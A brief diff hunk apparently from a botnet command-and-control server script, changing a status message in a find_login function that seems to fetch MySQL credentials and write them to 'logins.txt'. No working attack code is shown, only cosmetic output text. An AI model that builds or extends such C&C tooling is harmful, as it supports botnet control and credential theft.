@@ -344,7 +344,7 @@ def find_login(client,username, password,username_sql):
                 break
             else:
                 color_random = color()
-                send(client, f'''{color_random}WAITING TO GET MYSQL:{req.status_code} . . .''')
+                send(client, f'''{color_random}WAITING TO GET MYSQL . . .''')
                 send(client, f"\33]0;C&C CAN'T GET MYSQL {count_get_mysql_user_pass}:{req.status_code}\a", False)
                 print("TRYING . . .")
     file = open('logins.txt',"wb")
